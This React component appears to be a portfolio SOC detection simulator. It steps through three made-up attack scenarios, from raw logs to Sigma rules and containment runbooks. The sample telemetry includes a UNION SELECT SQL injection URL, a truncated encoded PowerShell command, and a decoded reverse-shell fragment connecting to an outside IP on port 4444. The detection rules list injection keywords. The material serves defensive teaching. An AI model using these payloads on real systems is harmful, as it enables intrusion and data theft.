import React, { useState, useEffect, useRef } from 'react';
import { 
  ShieldAlert, 
  Terminal, 
  Play, 
  Pause, 
  RotateCcw, 
  ChevronRight, 
  ArrowRight, 
  Activity, 
  Cpu, 
  Filter, 
  CheckCircle2, 
  AlertTriangle, 
  Radio, 
  Layers, 
  FileCode,
  ShieldCheck,
  Server
} from 'lucide-react';
import KineticHeading from './KineticHeading';

const SCENARIOS = [
  {
    id: 'credential_access',
    title: 'Password Spraying / Brute Force',
    technique: 'T1110.001',
    tactic: 'Credential Access',
    target: 'Corporate Banking SSO / VPN Gateway',
    severity: 'HIGH',
    severityColor: '#ff9900',
    summary: 'Distributed credential attack cycling common passwords across 40+ user accounts from Tor exit nodes to bypass account lockouts.',
    stages: [
      {
        id: 'raw_event',
        name: 'Raw Threat Event',
        sub: 'Attacker Activity',
        icon: 'ShieldAlert',
        badge: 'PORT 443 / HTTPS',
        description: 'Attacker executes automated dictionary attack against the banking gateway authentication endpoint.',
        payloadType: 'Syslog / HTTP Payload',
        code: `2026-11-21T18:42:10.123Z auth-gw[4821]: Failed password for user "administrator" from 185.220.101.45 port 54822
2026-11-21T18:42:11.452Z auth-gw[4821]: Failed password for user "finance_svc" from 185.220.101.45 port 54824
2026-11-21T18:42:12.781Z auth-gw[4821]: Failed password for user "harsh.g" from 185.220.101.45 port 54826
2026-11-21T18:42:14.019Z auth-gw[4821]: Burst rate: 14 failed attempts / 5s [SUSPICIOUS_SPRAY]`,
        metrics: [
          { label: 'Attacker IP', val: '185.220.101.45 (Tor Relay)' },
          { label: 'Protocol', val: 'HTTPS / TLSv1.3' },
          { label: 'Target Users', val: '42 Distinct Accounts' }
        ]
      },
      {
        id: 'ingestion',
        name: 'Telemetry Ingestion',
        sub: 'Collector & Pipeline',
        icon: 'Radio',
        badge: 'KAFKA BUFFER',
        description: 'Perimeter syslog stream collected by Logstash forwarders and published into real-time Kafka telemetry queue.',
        payloadType: 'JSON Streaming Pipeline',
        code: `{
  "@timestamp": "2026-11-21T18:42:14.020Z",
  "log.source": "/var/log/secure",
  "host.hostname": "gateway-proxy-prod-02",
  "stream.topic": "telemetry.security.auth",
  "collector.latency_ms": 3.8,
  "queue.partition": 4,
  "geoip": {
    "country": "Germany",
    "city": "Frankfurt",
    "asn": "AS208298 (Tor Exit Network)"
  }
}`,
        metrics: [
          { label: 'Collector Latency', val: '3.8 ms' },
          { label: 'Stream Topic', val: 'telemetry.security.auth' },
          { label: 'Threat Feed Match', val: 'Known Tor Relay (100%)' }
        ]
      },
      {
        id: 'normalization',
        name: 'Log Normalization',
        sub: 'CIM / ECS Mapping',
        icon: 'Filter',
        badge: 'ECS v8.11',
        description: 'Raw logs parsed and standardized into Elastic Common Schema (ECS) fields to enable multi-vendor correlation.',
        payloadType: 'Normalized Field Map',
        code: `{
  "event.category": ["authentication"],
  "event.type": ["access", "denied"],
  "event.outcome": "failure",
  "source.ip": "185.220.101.45",
  "source.port": 54826,
  "destination.domain": "sso.bankcorp.internal",
  "user.name": "harsh.g",
  "threat.framework": "MITRE ATT&CK",
  "threat.technique.id": "T1110.001",
  "threat.tactic.name": "Credential Access"
}`,
        metrics: [
          { label: 'Schema Standard', val: 'Elastic Common Schema (ECS)' },
          { label: 'Field Mapping', val: '14 Keys Extracted' },
          { label: 'Parser Status', val: '100% Validated' }
        ]
      },
      {
        id: 'detection_rule',
        name: 'Sigma / SIEM Detection',
        sub: 'Correlation Engine',
        icon: 'FileCode',
        badge: 'SIGMA PRODUCTION',
        description: 'Real-time SIEM correlation rule evaluates streaming window for threshold breaches across distributed accounts.',
        payloadType: 'Sigma YAML Rule',
        code: `title: Distributed Password Spraying on Authentication Gateway
id: e4b2d109-9b93-4a0b-b1a3-maximus-001
status: production
logsource:
  category: authentication
  product: banking_gateway
detection:
  selection:
    event.outcome: 'failure'
  timeframe: 1m
  condition: selection | count(user.name) by source.ip > 10
fields:
  - source.ip
  - user.name
level: high
tags:
  - attack.credential_access
  - attack.t1110.001`,
        metrics: [
          { label: 'Engine', val: 'Splunk / Elastic SIEM' },
          { label: 'Rule Severity', val: 'HIGH (Confidence 98%)' },
          { label: 'Threshold', val: '> 10 users / 60 seconds' }
        ]
      },
      {
        id: 'soc_triage',
        name: 'SOC Alert & Containment',
        sub: 'Incident Response',
        icon: 'ShieldCheck',
        badge: 'INCIDENT CONT_01',
        description: 'High-severity alert generated in SOC queue. Automated SOAR playbook isolates threat and pages Tier-1 Analyst.',
        payloadType: 'Maximus SOC Runbook Execution',
        code: `[INCIDENT #MAX-SEC-8924] // SEVERITY: HIGH
Status: CONTAINED & TRIAGED
Analyst Assigned: Harsh Ganeshwade (Maximus SOC)

AUTOMATED PLAYBOOK ACTIONS EXECUTED:
  [✔] Palo Alto Edge Firewall: Added 185.220.101.45 to Dynamic Blacklist (TTL 24h)
  [✔] Active Directory: Enforced step-up MFA challenge on 42 targeted users
  [✔] User Account Status: 0 Accounts Compromised (All attempts rejected)
  [✔] Notification: Security Bulletin broadcast to Tier-2 Engineering`,
        metrics: [
          { label: 'Incident Ticket', val: '#MAX-SEC-8924' },
          { label: 'Response Time', val: '1.2 seconds (Automated)' },
          { label: 'Outcome', val: 'IP Quarantined • Zero Breach' }
        ]
      }
    ]
  },
  {
    id: 'web_exploit',
    title: 'SQL Injection / Data Exfiltration',
    technique: 'T1190',
    tactic: 'Initial Access',
    target: 'Customer Banking Portal API (/v2/transactions)',
    severity: 'CRITICAL',
    severityColor: '#ff0055',
    summary: 'Targeted exploitation of public-facing API parameter with UNION SELECT payloads attempting to enumerate schema tables.',
    stages: [
      {
        id: 'raw_event',
        name: 'Raw Threat Event',
        sub: 'Attacker Activity',
        icon: 'ShieldAlert',
        badge: 'HTTP 500 / ATTACK',
        description: 'Attacker submits malicious SQL syntax through transaction query parameter.',
        payloadType: 'Nginx Access Log',
        code: `2026-11-21T19:04:32.412Z [WARN] client 91.240.118.82:59210 -> GET /api/v2/transactions?account_id=1092+UNION+SELECT+1,table_name,column_name+FROM+information_schema.columns-- HTTP/1.1
Host: api.banking.maximus.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) sqlmap/1.7#dev
Status: 500 Internal Server Error (PostgreSQL syntax exception leaked)`,
        metrics: [
          { label: 'Attacker IP', val: '91.240.118.82' },
          { label: 'Attack Vector', val: 'SQLi (UNION Based)' },
          { label: 'User-Agent', val: 'sqlmap/1.7 Automated Scanner' }
        ]
      },
      {
        id: 'ingestion',
        name: 'Telemetry Ingestion',
        sub: 'Collector & Pipeline',
        icon: 'Radio',
        badge: 'WAF INGEST',
        description: 'WAF engine intercepts application exception and streams full HTTP payload to security data lake.',
        payloadType: 'WAF Stream Record',
        code: `{
  "timestamp": "2026-11-21T19:04:32.415Z",
  "waf.rule_id": "OWASP_CRS_942100",
  "waf.action": "detected_alert",
  "client.ip": "91.240.118.82",
  "http.status": 500,
  "http.uri": "/api/v2/transactions",
  "matched_pattern": "UNION SELECT ... information_schema"
}`,
        metrics: [
          { label: 'WAF Engine', val: 'Imperva / Cloudflare WAF' },
          { label: 'OWASP Rule', val: '942100 (SQLi Signature)' },
          { label: 'Latency', val: '2.1 ms' }
        ]
      },
      {
        id: 'normalization',
        name: 'Log Normalization',
        sub: 'CIM / ECS Mapping',
        icon: 'Filter',
        badge: 'ECS MAPPED',
        description: 'HTTP request headers, SQL tokens, and database error states parsed into correlated fields.',
        payloadType: 'CIM Data Model',
        code: `{
  "event.dataset": "waf.access",
  "http.request.method": "GET",
  "url.path": "/api/v2/transactions",
  "url.query": "account_id=1092 UNION SELECT...",
  "threat.technique.name": "Exploit Public-Facing Application",
  "threat.technique.id": "T1190",
  "vulnerability.category": "CWE-89 (SQL Injection)"
}`,
        metrics: [
          { label: 'CWE ID', val: 'CWE-89 (SQLi)' },
          { label: 'Data Model', val: 'Web Application Security' },
          { label: 'Risk Score', val: '9.4 / 10' }
        ]
      },
      {
        id: 'detection_rule',
        name: 'Sigma / SIEM Detection',
        sub: 'Correlation Engine',
        icon: 'FileCode',
        badge: 'SIGMA CRITICAL',
        description: 'Rule matches SQL keywords in URI combined with HTTP 500 error code indicating backend query execution.',
        payloadType: 'Sigma YAML Rule',
        code: `title: Web Application SQL Injection via URI Query
id: 7c30a41d-318e-4f0f-8b2b-maximus-002
status: production
logsource:
  category: webserver
detection:
  keywords:
    - 'UNION SELECT'
    - 'information_schema'
    - 'pg_sleep'
  status_code:
    http.response.status_code: [200, 500]
  condition: keywords and status_code
level: critical
tags:
  - attack.initial_access
  - attack.t1190`,
        metrics: [
          { label: 'Severity', val: 'CRITICAL' },
          { label: 'Correlation', val: 'URI Token + HTTP 500' },
          { label: 'MITRE ID', val: 'T1190' }
        ]
      },
      {
        id: 'soc_triage',
        name: 'SOC Alert & Containment',
        sub: 'Incident Response',
        icon: 'ShieldCheck',
        badge: 'TRIAGE CONFIRMED',
        description: 'Emergency containment initiated: WAF policy converted from monitor to drop, developer ticket raised for prepared statement patch.',
        payloadType: 'Maximus SOC Runbook Execution',
        code: `[INCIDENT #MAX-SEC-8925] // SEVERITY: CRITICAL
Status: RESOLVED & PATCHED
Lead Analyst: Harsh Ganeshwade (Maximus SOC)

TRIAGE & REMEDIATION ACTIONS:
  [✔] WAF Policy: Elevated SQLi signature to BLOCK (Instant 403 Forbidden)
  [✔] Database Audit: Scanned query logs; zero customer records exposed
  [✔] Code Fix: Issued PR enforcing PostgreSQL Parameterized Queries ($1, $2)
  [✔] Post-Mortem: Risk downgraded from Critical (9.4) to Neutral (0.0)`,
        metrics: [
          { label: 'Action Taken', val: 'WAF Rule Elevated to DROP' },
          { label: 'Data Leaked', val: '0 Records (Neutralized)' },
          { label: 'Fix Status', val: 'Parameterized Query Enforced' }
        ]
      }
    ]
  },
  {
    id: 'execution_edr',
    title: 'Encoded PowerShell / Defense Evasion',
    technique: 'T1059.001',
    tactic: 'Execution & Evasion',
    target: 'Internal Finance Workstation (CORP-FIN-WS04)',
    severity: 'CRITICAL',
    severityColor: '#ff0055',
    summary: 'Macro-enabled phishing spreadsheet spawning an obfuscated, hidden Base64-encoded PowerShell child process.',
    stages: [
      {
        id: 'raw_event',
        name: 'Raw Threat Event',
        sub: 'Attacker Activity',
        icon: 'ShieldAlert',
        badge: 'SYSMON EID 1',
        description: 'Excel application spawns child shell process with hidden window and encoded payload flags.',
        payloadType: 'Windows Sysmon Event 1',
        code: `EventID: 1 (Process Creation)
UtcTime: 2026-11-21 19:18:04.221
ProcessId: 8940
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -w hidden -noni -enc JABjAGwAaQBlAG4AdAA...
ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE
User: BANKCORP\\a.sharma (Accountant)`,
        metrics: [
          { label: 'Parent Process', val: 'EXCEL.EXE' },
          { label: 'Child Process', val: 'powershell.exe (Hidden)' },
          { label: 'Target Host', val: 'CORP-FIN-WS04' }
        ]
      },
      {
        id: 'ingestion',
        name: 'Telemetry Ingestion',
        sub: 'Collector & Pipeline',
        icon: 'Radio',
        badge: 'EDR AGENT',
        description: 'Endpoint Detection & Response (EDR) agent streams process telemetry event to central detection engine.',
        payloadType: 'EDR Event Telemetry',
        code: `{
  "agent.id": "edr-agent-84920",
  "endpoint.hostname": "CORP-FIN-WS04",
  "endpoint.os": "Windows 11 Enterprise",
  "process.hash.sha256": "89a42f5c1d...31",
  "parent.pid": 4120,
  "child.pid": 8940,
  "telemetry.queue_latency": "1.4ms"
}`,
        metrics: [
          { label: 'EDR Platform', val: 'CrowdStrike / Defender for Endpoint' },
          { label: 'Agent Status', val: 'Active • Sensor Health 100%' },
          { label: 'Latency', val: '1.4 ms' }
        ]
      },
      {
        id: 'normalization',
        name: 'Log Normalization',
        sub: 'CIM / ECS Mapping',
        icon: 'Filter',
        badge: 'PROCESS TREE',
        description: 'Parent-child process relationship mapped with decoded command string for forensic examination.',
        payloadType: 'Decoded Process Metadata',
        code: `{
  "process.parent.name": "excel.exe",
  "process.name": "powershell.exe",
  "process.args": ["-w", "hidden", "-enc"],
  "process.decoded_command": "$client = New-Object System.Net.Sockets.TCPClient('194.87.139.10', 4444)...",
  "threat.tactic.name": "Execution",
  "threat.technique.id": "T1059.001"
}`,
        metrics: [
          { label: 'Decoded Payload', val: 'Reverse TCP Shell Script' },
          { label: 'C2 IP Target', val: '194.87.139.10:4444' },
          { label: 'Evasion Flags', val: '-w hidden (Bypassed GUI)' }
        ]
      },
      {
        id: 'detection_rule',
        name: 'Sigma / SIEM Detection',
        sub: 'Correlation Engine',
        icon: 'FileCode',
        badge: 'SIGMA EDR',
        description: 'Rule triggers on Office suite executables spawning PowerShell with encoded or hidden command switches.',
        payloadType: 'Sigma YAML Rule',
        code: `title: Suspicious PowerShell Child of Microsoft Office
id: 9a8c1f02-45e1-4822-a982-maximus-003
status: production
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    ParentImage|endswith:
      - '\\excel.exe'
      - '\\winword.exe'
    Image|endswith: '\\powershell.exe'
    CommandLine|contains:
      - '-enc'
      - '-w hidden'
  condition: selection
level: critical
tags:
  - attack.execution
  - attack.t1059.001`,
        metrics: [
          { label: 'Severity', val: 'CRITICAL' },
          { label: 'Process Relationship', val: 'Office -> PowerShell' },
          { label: 'False Positive Rate', val: '< 0.01% (Highly Specific)' }
        ]
      },
      {
        id: 'soc_triage',
        name: 'SOC Alert & Containment',
        sub: 'Incident Response',
        icon: 'ShieldCheck',
        badge: 'HOST ISOLATED',
        description: 'Workstation automatically isolated from corporate LAN, malicious process tree killed, and C2 IP sinkholed.',
        payloadType: 'Maximus SOC Runbook Execution',
        code: `[INCIDENT #MAX-SEC-8926] // SEVERITY: CRITICAL
Status: HOST ISOLATED • C2 SEVERED
Investigating Analyst: Harsh Ganeshwade (Maximus SOC)

INCIDENT CONTAINMENT & FORENSIC STEPS:
  [✔] EDR Action: Network Isolation enabled on CORP-FIN-WS04 (LAN Severed)
  [✔] Process Termination: Killed PID 8940 (powershell.exe) and PID 4120
  [✔] Memory Dump: Acquired process memory before termination for sandbox analysis
  [✔] Perimeter Defense: Added 194.87.139.10 to DNS Sinkhole and Firewall Blocklist`,
        metrics: [
          { label: 'Host Isolation', val: 'Active (LAN traffic severed)' },
          { label: 'C2 Callback', val: 'Sinkholed before connection' },
          { label: 'Endpoint Health', val: 'Cleaned • Malicious Macro Quarantined' }
        ]
      }
    ]
  }
];

const DetectionVisualizer = () => {
  const [selectedScenarioIndex, setSelectedScenarioIndex] = useState(0);
  const [activeStageIndex, setActiveStageIndex] = useState(0);
  const [isPlaying, setIsPlaying] = useState(false);
  const timerRef = useRef(null);

  const scenario = SCENARIOS[selectedScenarioIndex];
  const currentStage = scenario.stages[activeStageIndex];

  // Auto-play simulation cycle
  useEffect(() => {
    if (isPlaying) {
      timerRef.current = setInterval(() => {
        setActiveStageIndex((prev) => {
          if (prev < scenario.stages.length - 1) {
            return prev + 1;
          } else {
            setIsPlaying(false);
            return prev;
          }
        });
      }, 3000);
    } else {
      if (timerRef.current) clearInterval(timerRef.current);
    }
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, [isPlaying, scenario.stages.length]);

  const handleScenarioChange = (idx) => {
    setSelectedScenarioIndex(idx);
    setActiveStageIndex(0);
    setIsPlaying(false);
  };

  const handleReset = () => {
    setActiveStageIndex(0);
    setIsPlaying(false);
  };

  const handleNext = () => {
    if (activeStageIndex < scenario.stages.length - 1) {
      setActiveStageIndex(activeStageIndex + 1);
    }
  };

  const handlePrev = () => {
    if (activeStageIndex > 0) {
      setActiveStageIndex(activeStageIndex - 1);
    }
  };

  return (
    <section id="detection-lab" className="section container detection-lab-section">
      <KineticHeading 
        subtitle="SOC Operations & Telemetry"
        title="MITRE ATT&CK & Detection"
        highlight="Pipeline"
      />

      <div className="detection-lab-intro">
        <p>
          Interactive SOC Telemetry Simulator demonstrating how raw threat telemetry flows from initial attacker execution, through log ingestion and ECS normalization, to Sigma correlation and automated SOC incident triage.
        </p>
      </div>

      {/* Scenario Selector Pills */}
      <div className="scenario-selector-wrap">
        <span className="selector-label">// SELECT ATTACK VECTOR:</span>
        <div className="scenario-pills">
          {SCENARIOS.map((sc, idx) => {
            const isActive = idx === selectedScenarioIndex;
            return (
              <button
                key={sc.id}
                onClick={() => handleScenarioChange(idx)}
                className={`scenario-pill ${isActive ? 'active' : ''}`}
                style={isActive ? { borderColor: sc.severityColor, boxShadow: `0 0 15px ${sc.severityColor}33` } : undefined}
              >
                <span className="pill-mitre">[{sc.technique}]</span>
                <span className="pill-title">{sc.title}</span>
                <span className="pill-badge" style={{ color: sc.severityColor, borderColor: `${sc.severityColor}55` }}>
                  {sc.severity}
                </span>
              </button>
            );
          })}
        </div>
      </div>

      {/* Main Interactive Lab Card */}
      <div className="detection-lab-card cyber-card">
        {/* Scenario Header Info */}
        <div className="lab-header">
          <div className="lab-header-left">
            <div className="threat-tactic-badge">
              <Activity size={13} />
              <span>TACTIC: {scenario.tactic.toUpperCase()}</span>
            </div>
            <h3 className="threat-title">{scenario.title} <span className="technique-code">({scenario.technique})</span></h3>
            <p className="threat-target"><strong>Target Asset:</strong> {scenario.target}</p>
          </div>

          <div className="lab-header-controls">
            <button 
              onClick={() => setIsPlaying(!isPlaying)} 
              className={`control-btn play-btn ${isPlaying ? 'playing' : ''}`}
              title={isPlaying ? 'Pause Simulation' : 'Auto-Play Simulation'}
            >
              {isPlaying ? <Pause size={14} /> : <Play size={14} />}
              <span>{isPlaying ? 'PAUSE' : 'SIMULATE'}</span>
            </button>
            <button 
              onClick={handleReset} 
              className="control-btn" 
              title="Reset to Stage 1"
            >
              <RotateCcw size={14} />
            </button>
          </div>
        </div>

        {/* 5-Stage Visual Stepper Pipeline */}
        <div className="pipeline-stepper-wrap">
          <div className="pipeline-stepper">
            {scenario.stages.map((st, idx) => {
              const isActive = idx === activeStageIndex;
              const isPast = idx < activeStageIndex;
              return (
                <div 
                  key={st.id} 
                  className={`stepper-node ${isActive ? 'active' : ''} ${isPast ? 'past' : ''}`}
                  onClick={() => { setActiveStageIndex(idx); setIsPlaying(false); }}
                >
                  <div className="node-marker">
                    <span className="node-number">0{idx + 1}</span>
                    {isPast && <CheckCircle2 size={12} className="node-check" />}
                  </div>
                  <div className="node-info">
                    <span className="node-title">{st.name}</span>
                    <span className="node-sub">{st.sub}</span>
                  </div>
                  {idx < scenario.stages.length - 1 && (
                    <div className={`stepper-connector ${idx < activeStageIndex ? 'filled' : ''}`}>
                      <div className="packet-pulse"></div>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>

        {/* Stage Telemetry Inspector */}
        <div className="stage-inspector-grid">
          {/* Left Column: Stage Details & Metrics */}
          <div className="inspector-details">
            <div className="stage-meta-header">
              <span className="stage-step-tag">STAGE 0{activeStageIndex + 1} OF 05</span>
              <span className="stage-badge">{currentStage.badge}</span>
            </div>

            <h4 className="stage-heading">{currentStage.name}</h4>
            <p className="stage-desc">{currentStage.description}</p>

            <div className="stage-metrics-card">
              <span className="metrics-card-title">// TELEMETRY ARTIFACTS</span>
              <div className="metrics-list">
                {currentStage.metrics.map((m, i) => (
                  <div key={i} className="metric-row">
                    <span className="metric-label">{m.label}:</span>
                    <span className="metric-value">{m.val}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* Step navigation buttons */}
            <div className="stage-nav-btns">
              <button 
                onClick={handlePrev} 
                disabled={activeStageIndex === 0} 
                className="stage-nav-btn prev"
              >
                ◀ PREV STAGE
              </button>
              <button 
                onClick={handleNext} 
                disabled={activeStageIndex === scenario.stages.length - 1} 
                className="stage-nav-btn next"
              >
                NEXT STAGE ▶
              </button>
            </div>
          </div>

          {/* Right Column: Code / Log / Rule Terminal */}
          <div className="inspector-terminal">
            <div className="terminal-topbar">
              <div className="terminal-dots">
                <span className="dot red"></span>
                <span className="dot yellow"></span>
                <span className="dot green"></span>
              </div>
              <span className="terminal-filename">
                {currentStage.payloadType}
              </span>
              <span className="terminal-status">LIVE_TELEMETRY</span>
            </div>

            <div className="terminal-code-body">
              <pre className="code-content">
                <code>{currentStage.code}</code>
              </pre>
            </div>
          </div>
        </div>

        {/* SOC Analyst Verification Footer */}
        <div className="lab-footer">
          <div className="lab-footer-status">
            <ShieldCheck size={16} className="footer-shield-icon" />
            <span>
              <strong>MAXIMUS SOC METHODOLOGY:</strong> Real-time SIEM log correlation and automated SOAR containment modelled after production detection runbooks.
            </span>
          </div>
          <span className="lab-footer-tag">MITRE ATT&CK v14 COMPLIANT</span>
        </div>
      </div>

      <style>{`
        .detection-lab-section {
          padding-top: 4rem;
          padding-bottom: 5rem;
        }

        .detection-lab-intro {
          text-align: center;
          max-width: 780px;
          margin: -2.5rem auto 2.5rem;
          color: var(--text-secondary);
          font-size: 0.95rem;
          line-height: 1.6;
        }

        .scenario-selector-wrap {
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 0.8rem;
          margin-bottom: 2rem;
        }

        .selector-label {
          font-family: var(--font-heading);
          font-size: 0.72rem;
          letter-spacing: 2px;
          color: var(--text-secondary);
          opacity: 0.8;
        }

        .scenario-pills {
          display: flex;
          flex-wrap: wrap;
          justify-content: center;
          gap: 0.8rem;
        }

        .scenario-pill {
          background: rgba(0, 0, 0, 0.6);
          border: 1px solid var(--glass-border);
          border-radius: 8px;
          padding: 0.6rem 1rem;
          color: var(--text-secondary);
          font-family: var(--font-heading);
          font-size: 0.8rem;
          cursor: pointer;
          display: inline-flex;
          align-items: center;
          gap: 8px;
          transition: all 0.25s ease;
        }

        .scenario-pill:hover {
          background: rgba(0, 229, 163, 0.08);
          border-color: var(--primary);
          color: #fff;
          transform: translateY(-2px);
        }

        .scenario-pill.active {
          background: rgba(0, 255, 249, 0.08);
          color: #fff;
        }

        .pill-mitre {
          color: var(--primary);
          font-weight: 700;
          font-size: 0.75rem;
        }

        .pill-title {
          font-weight: 600;
        }

        .pill-badge {
          font-size: 0.62rem;
          border: 1px solid;
          padding: 1px 6px;
          border-radius: 10px;
          font-weight: 700;
        }

        /* Lab Card */
        .detection-lab-card {
          border-radius: 12px;
          padding: 2rem;
          box-shadow: 0 0 30px rgba(0, 0, 0, 0.7);
        }

        .lab-header {
          display: flex;
          justify-content: space-between;
          align-items: flex-start;
          flex-wrap: wrap;
          gap: 1.2rem;
          padding-bottom: 1.5rem;
          border-bottom: 1px solid var(--glass-border);
          margin-bottom: 2rem;
        }

        .threat-tactic-badge {
          display: inline-flex;
          align-items: center;
          gap: 6px;
          font-size: 0.7rem;
          font-family: var(--font-heading);
          color: var(--primary);
          background: rgba(0, 229, 163, 0.08);
          border: 1px solid var(--glass-border);
          padding: 0.2rem 0.6rem;
          border-radius: 4px;
          margin-bottom: 0.5rem;
        }

        .threat-title {
          font-size: 1.35rem;
          color: #fff;
          font-weight: 800;
          margin-bottom: 0.3rem;
        }

        .technique-code {
          color: #00fff9;
          font-weight: 600;
        }

        .threat-target {
          font-size: 0.85rem;
          color: var(--text-secondary);
        }

        .lab-header-controls {
          display: flex;
          align-items: center;
          gap: 0.6rem;
        }

        .control-btn {
          background: rgba(0, 0, 0, 0.6);
          border: 1px solid var(--glass-border);
          color: var(--text-primary);
          padding: 0.5rem 0.85rem;
          border-radius: 6px;
          font-family: var(--font-heading);
          font-size: 0.75rem;
          cursor: pointer;
          display: inline-flex;
          align-items: center;
          gap: 6px;
          transition: all 0.2s ease;
        }

        .control-btn:hover {
          background: var(--glass-hover);
          border-color: var(--primary);
          color: var(--primary);
        }

        .play-btn {
          background: rgba(0, 229, 163, 0.12);
          border-color: var(--primary);
          color: var(--primary);
          font-weight: 700;
        }

        .play-btn:hover, .play-btn.playing {
          background: var(--primary);
          color: #000;
          box-shadow: 0 0 15px var(--primary-glow);
        }

        /* Stepper */
        .pipeline-stepper-wrap {
          overflow-x: auto;
          padding-bottom: 1.5rem;
          margin-bottom: 2rem;
          border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .pipeline-stepper {
          display: flex;
          align-items: center;
          min-width: 750px;
          justify-content: space-between;
          position: relative;
        }

        .stepper-node {
          display: flex;
          align-items: center;
          gap: 10px;
          cursor: pointer;
          position: relative;
          user-select: none;
          transition: transform 0.2s ease;
        }

        .stepper-node:hover {
          transform: translateY(-2px);
        }

        .node-marker {
          width: 38px;
          height: 38px;
          border-radius: 50%;
          background: #060b11;
          border: 2px solid var(--glass-border);
          display: flex;
          align-items: center;
          justify-content: center;
          position: relative;
          font-family: var(--font-heading);
          font-size: 0.8rem;
          font-weight: 700;
          color: #888;
          transition: all 0.3s ease;
          flex-shrink: 0;
        }

        .stepper-node.active .node-marker {
          border-color: #00fff9;
          color: #00fff9;
          background: rgba(0, 255, 249, 0.15);
          box-shadow: 0 0 18px rgba(0, 255, 249, 0.5);
        }

        .stepper-node.past .node-marker {
          border-color: var(--primary);
          color: var(--primary);
          background: rgba(0, 229, 163, 0.1);
        }

        .node-check {
          position: absolute;
          top: -3px;
          right: -3px;
          color: var(--primary);
          background: #000;
          border-radius: 50%;
        }

        .node-info {
          display: flex;
          flex-direction: column;
        }

        .node-title {
          font-family: var(--font-heading);
          font-size: 0.82rem;
          font-weight: 700;
          color: var(--text-primary);
        }

        .stepper-node.active .node-title {
          color: #00fff9;
        }

        .node-sub {
          font-size: 0.68rem;
          color: #888;
        }

        .stepper-connector {
          flex: 1;
          height: 2px;
          background: rgba(255, 255, 255, 0.1);
          margin: 0 12px;
          position: relative;
          overflow: hidden;
        }

        .stepper-connector.filled {
          background: var(--primary);
          box-shadow: 0 0 8px var(--primary-glow);
        }

        .packet-pulse {
          position: absolute;
          width: 25px;
          height: 100%;
          background: linear-gradient(90deg, transparent, #00fff9, transparent);
          animation: flowPulse 2s linear infinite;
        }

        @keyframes flowPulse {
          0% { left: -30px; }
          100% { left: 100%; }
        }

        /* Stage Inspector */
        .stage-inspector-grid {
          display: grid;
          grid-template-columns: 1fr 1.35fr;
          gap: 2rem;
          align-items: stretch;
          margin-bottom: 2rem;
        }

        .inspector-details {
          display: flex;
          flex-direction: column;
          justify-content: space-between;
        }

        .stage-meta-header {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 0.8rem;
        }

        .stage-step-tag {
          font-family: var(--font-heading);
          font-size: 0.68rem;
          font-weight: 700;
          color: var(--primary);
          letter-spacing: 1.5px;
        }

        .stage-badge {
          font-family: var(--font-heading);
          font-size: 0.62rem;
          font-weight: 700;
          padding: 2px 7px;
          background: rgba(0, 255, 249, 0.08);
          border: 1px solid rgba(0, 255, 249, 0.3);
          color: #00fff9;
          border-radius: 4px;
        }

        .stage-heading {
          font-size: 1.4rem;
          color: #fff;
          font-weight: 800;
          margin-bottom: 0.6rem;
        }

        .stage-desc {
          font-size: 0.88rem;
          color: var(--text-secondary);
          line-height: 1.6;
          margin-bottom: 1.5rem;
        }

        .stage-metrics-card {
          background: rgba(0, 0, 0, 0.5);
          border: 1px solid var(--glass-border);
          border-radius: 8px;
          padding: 1rem 1.2rem;
          margin-bottom: 1.5rem;
        }

        .metrics-card-title {
          font-family: var(--font-heading);
          font-size: 0.68rem;
          letter-spacing: 1.5px;
          color: var(--primary);
          display: block;
          margin-bottom: 0.8rem;
        }

        .metrics-list {
          display: flex;
          flex-direction: column;
          gap: 0.5rem;
        }

        .metric-row {
          display: flex;
          justify-content: space-between;
          font-size: 0.82rem;
          padding-bottom: 0.35rem;
          border-bottom: 1px dashed rgba(255, 255, 255, 0.05);
        }

        .metric-label {
          color: #888;
          font-family: var(--font-heading);
        }

        .metric-value {
          color: #e2e8f0;
          font-weight: 600;
          font-family: var(--font-heading);
        }

        .stage-nav-btns {
          display: flex;
          gap: 0.8rem;
        }

        .stage-nav-btn {
          flex: 1;
          background: rgba(0, 229, 163, 0.05);
          border: 1px solid var(--glass-border);
          color: var(--text-primary);
          padding: 0.6rem;
          border-radius: 6px;
          font-family: var(--font-heading);
          font-size: 0.75rem;
          font-weight: 700;
          cursor: pointer;
          transition: all 0.2s ease;
        }

        .stage-nav-btn:hover:not(:disabled) {
          background: var(--primary);
          color: #000;
          box-shadow: 0 0 12px var(--primary-glow);
        }

        .stage-nav-btn:disabled {
          opacity: 0.3;
          cursor: not-allowed;
        }

        /* Terminal Body */
        .inspector-terminal {
          background: #030810;
          border: 1px solid var(--glass-border);
          border-radius: 8px;
          display: flex;
          flex-direction: column;
          overflow: hidden;
          box-shadow: inset 0 0 30px rgba(0, 0, 0, 0.8);
        }

        .terminal-topbar {
          background: #070e1a;
          padding: 0.6rem 1rem;
          display: flex;
          align-items: center;
          justify-content: space-between;
          border-bottom: 1px solid var(--glass-border);
        }

        .terminal-dots {
          display: flex;
          gap: 5px;
        }

        .terminal-dots .dot {
          width: 9px;
          height: 9px;
          border-radius: 50%;
        }

        .dot.red { background: #ff5f56; }
        .dot.yellow { background: #ffbd2e; }
        .dot.green { background: #27c93f; }

        .terminal-filename {
          font-family: var(--font-heading);
          font-size: 0.72rem;
          color: var(--primary);
          font-weight: 600;
        }

        .terminal-status {
          font-family: var(--font-heading);
          font-size: 0.6rem;
          color: #00fff9;
          letter-spacing: 1px;
        }

        .terminal-code-body {
          padding: 1.2rem;
          overflow: auto;
          flex: 1;
          max-height: 380px;
        }

        .code-content {
          font-family: 'JetBrains Mono', Consolas, Monaco, monospace;
          font-size: 0.78rem;
          color: #a6accd;
          line-height: 1.6;
          white-space: pre-wrap;
          word-break: break-all;
        }

        /* Footer */
        .lab-footer {
          display: flex;
          justify-content: space-between;
          align-items: center;
          flex-wrap: wrap;
          gap: 1rem;
          padding-top: 1.2rem;
          border-top: 1px solid var(--glass-border);
          font-size: 0.78rem;
        }

        .lab-footer-status {
